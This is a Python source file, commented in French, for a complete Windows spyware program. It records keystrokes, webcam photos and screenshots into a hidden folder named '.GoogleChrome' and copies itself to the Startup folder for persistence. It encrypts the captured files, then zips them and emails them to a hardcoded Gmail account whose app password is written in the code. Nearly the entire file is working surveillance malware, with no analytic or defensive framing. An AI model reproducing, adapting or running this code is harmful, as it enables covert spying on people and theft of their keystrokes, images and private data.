

import cv2
from datetime import datetime
import logging, time
from pynput.keyboard import Listener as KeyboardListener
import threading
from PIL import ImageGrab
import os
import yagmail
import shutil
import subprocess
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import secrets
import sys


user = os.getlogin()
folder= f'C:\\Users\\{user}\\AppData\\Local\\.GoogleChrome'
#1 mo en octets
SIZE_LIMIT = 1 * 1024 * 1024 
#signale l'arret des threads
stop_event = threading.Event()  






def onPressedListener(keyboard):
    logging.info(str(keyboard))


#### THREAD FUNCTIONS #############################

def screenshot_photo_kelogger(duration,listener,aes_key,public_key_file):
    end_time = time.time() + duration
    while time.time() < end_time:
        #verifie si arret declenche
        if stop_event.is_set():
            print("arret des photos et screenshots")
            break
        
        captured_img = capture_image()
        if captured_img is not None:
            image = save_image(captured_img, folder)

            #chiffrement du fichier avec aes et changement de l'extension
            encrypt_aes(image, aes_key)
            os.remove(image)
            #chiffrement de la clé aes avec rsa et changement de l'extension
           

        screenshot_file = screenshot()

        #chiffrement du fichier avec aes et changement de l'extension
        encrypt_aes(screenshot_file, aes_key)

        os.remove(screenshot_file)
         #chiffrement de la clé aes avec rsa et changement de l'extension
      
        #pause de 6 secondes  
        time.sleep(6) 
        end_time = time.time() + duration
        
        #verifie taille du dossier apres chaque ajout de fichier
        folder_size = get_folder_size(folder)
        if folder_size >= SIZE_LIMIT:
            print("je fais 1Mo")

            #arret des threads
            stop_event.set()  
            logging.shutdown()
            keylogger_path =f'{folder}\\keylogger.txt'
            #chiffrement du fichier avec aes et changement de l'extension
            encrypt_aes(keylogger_path, aes_key)

            os.remove(keylogger_path)
            #chiffrement de la clé aes avec rsa et changement de l'extension
            encrypt_rsa(aes_key, public_key_file,folder)
            listener.stop()
            break
        




### IMAGE FUNCTIONS  #############################

def capture_image():
    """fait une photo"""
    camera = cv2.VideoCapture(0)
    if not camera.isOpened():
        print("camera inaccessible")
        return None
    
    #fait plusieurs photosr
    for _ in range(10):  
        success, image = camera.read()

    camera.release()
    cv2.waitKey(0)
    cv2.destroyAllWindows()

    return image if success else None



def save_image(img, folder):
    """enregistre l'image dans le dossier"""
    date = datetime.now().strftime("%d_%m_%Y__%H-%M-%S") 
    filename = f"photo_{date}.png"
    path = os.path.join(folder, filename)
    cv2.imwrite(path, img)
    return path



### SCREENSHOT FUNCTION  #############################

def screenshot():
    """fait des captures d'ecran et les place dans un dossier"""
    extend = "\\"
    image = ImageGrab.grab()
    date = datetime.now().strftime("%d_%m_%Y__%H-%M-%S") 
    screenshot_name= f"screnshoot_{date}.png"
    file= folder + extend + screenshot_name
    image.save(file)
    return file



### FOLDER FUNCTIONS  #############################

def get_folder_size(folder):
    """retourne la taille totale d'un dossier en octets """
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(folder):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            total_size += os.path.getsize(fp)
    return total_size



def zip(folder):
    #cree un fichier zip 
    zip_filename = folder + ".zip"
    shutil.make_archive(folder, 'zip', folder)
    
    return zip_filename

def delete_folder(folder):

    if os.path.exists(folder):
            try:
                #supprime le dossier et tout son contenu
                shutil.rmtree(folder)
                print(f"dossier supprime : {folder}")
            except Exception as e:
                print(f"erreur lors de la suppression du dossier : {e}")
    else:
        print(f"le dossier {folder} n'existe pas.")


### GMAIL FUNCTION  #############################

def gmail(folder):

    gmail_address= "l.edohcoffi@gmail.com"
    gmail_pwd = "vdww kkss mjji nuwu"
    #cree le fichier zip du dossier
    zip_file = zip(folder)
    
    hostname = os.environ['COMPUTERNAME']

    #info gmail
    receiver = gmail_address
    body = f'Bonjour,\nVoici le dossier du pc {hostname} ci-joint.'
    
    #connexion au compte yagmail
    yag_mail = yagmail.SMTP(gmail_address,gmail_pwd)  
    #envoi de l'email avec le dossier en pj
    yag_mail.send(
        to=receiver,
        subject=os.environ['COMPUTERNAME'],  
        contents=body,
        attachments=zip_file  
    )
    
    os.remove(zip_file)
    
   



### STARTUP FUNCTIONS  #############################

def startup_copy_file():

    #pour avoir chemin de l'exe
    executable_path = sys.executable
    
    #chemin startup
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    #chemin pour copie de l'exe
    startup_executable = os.path.join(startup_folder, os.path.basename(executable_path))

    #vrifie s'il n'existe pas deja
    if not os.path.exists(startup_executable):
        try:
            shutil.copy(executable_path, startup_executable)
           
        except Exception as e:
            print(f"erreur startup_copy_file: {e}")
   
        
   



### ENCRYPTION FUNCTIONS  #############################
def change_extension(input_file, new_extension):
    """remplace l'extension d'un fichier par une nouvelle"""
    #nom sans extension
    name = os.path.splitext(input_file)[0]  
    return f"{name}.{new_extension}"

def encrypt_aes(input_file, key):
    """chiffre un fichier avec aes"""
    #cree vecteur d'initialisation 
    init_vector = secrets.token_bytes(16)
    
    #cree le cipher AES avec le mode CFB et le vecteur d'init
    cipher = Cipher(algorithms.AES(key), modes.CFB(init_vector), backend=default_backend())
    encryptor = cipher.encryptor()

    
    output_file = change_extension(input_file, "enc")

    
    with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
        #ecrit vecteur d'init au debut du fichier chiffré
        f_out.write(init_vector) 
        #lit le fichier par blocs
        while chunk := f_in.read(4096):  
            f_out.write(encryptor.update(chunk))
        f_out.write(encryptor.finalize())
    
    #nom du fichier chiffre
    return output_file  

def encrypt_rsa(key, public_key_file,folder):
    """chiffre la cle aes avec rsa"""
    path_file= f'{folder}\\aes_key.bin'
    try:
        #ecrit la cle aes dans un fichier 
        with open(path_file, 'wb') as f:
            f.write(key)

        #nom du fichier pour la cle aes chiffree avec rsa
        output_file = change_extension(path_file, 'enc')

        #pour chiffrer cle aes avec rsa
        commande = ["openssl", "pkeyutl", "-encrypt", "-in", path_file, "-pubin", "-inkey", public_key_file, "-out", output_file]
        
        subprocess.run(commande, check=True)
        #supprime cle aes non chiffree
        os.remove(path_file)  
    except subprocess.CalledProcessError as e:
        print(f"erreur le chiffrement de la cle aes a echoue : {e}")
        return None
    
    #nom du fichier chiffre contenant la cle aes
    return output_file 



### MAIN FUNCTION  ############################################

def main():
     
    user = os.getlogin()
    #folder = os.getenv('FOLDER_PATH')
    folder= f'C:\\Users\\{user}\\AppData\\Local\\.GoogleChrome'
    #cree le dossier 
    if not os.path.exists(folder):
        os.mkdir(folder)
        os.system(f'attrib +h "{folder}"')

    startup_copy_file()

   #pour reconfigurer le logging
    logging.shutdown()
    for handler in logging.root.handlers[:]:
        logging.root.removeHandler(handler)

    #configure fichier de log 
    log_filename = os.path.join(folder, 'keylogger.txt')
    logging.basicConfig(
        filename=log_filename,
        filemode="w",
        level=logging.DEBUG,
        format='%(asctime)s - %(message)s\n',
        datefmt='%d/%m/%Y %H:%M:%S'
    )
    #chiffrement
    public_key_file = os.getenv('PUB_KEY')
    #cle aes de 256 bits
    aes_key = secrets.token_bytes(32)
    
    with KeyboardListener(on_press=onPressedListener) as listener:
        # thread qui commence toute les captures
        thread_screenshot = threading.Thread(target=screenshot_photo_kelogger, args=(6.0,listener,aes_key,public_key_file))
       

        thread_screenshot.start()

        #attend la fin du thread screenshot
        thread_screenshot.join() 
        #Attend la fin du listener
        listener.join()  

    gmail(folder) 
    delete_folder(folder) 
    print("fin")
    stop_event.clear()
    main()
    
 
    

if __name__ == "__main__":
    
    main()
